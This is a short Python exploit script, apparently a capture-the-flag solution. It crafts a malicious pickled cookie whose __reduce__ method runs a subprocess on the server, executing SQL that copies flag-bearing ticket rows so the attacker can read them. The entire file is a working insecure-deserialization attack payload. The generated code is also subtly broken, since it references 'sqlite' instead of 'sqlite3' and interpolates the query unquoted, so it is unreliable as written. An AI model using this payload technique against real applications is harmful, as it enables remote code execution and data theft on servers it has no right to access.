# TODO: automate entire process.

import base64
import pickle
import subprocess

# Username isn't relevant, but must be nonempty.
query = """INSERT INTO TICKET (header, description, timestamp, user)
SELECT header, description, timestamp, ' '
FROM ticket
WHERE header LIKE '%flag{%}%' OR description LIKE '%flag{%}%'"""

program = f"import sqlite3; sqlite.connect('database.db').execute({query})"

class Injection:
    def __reduce__(self):
        return subprocess.run, (("python3", "-c", program),)

cookie = base64.b64encode(pickle.dumps(Injection())).decode()
print(cookie)
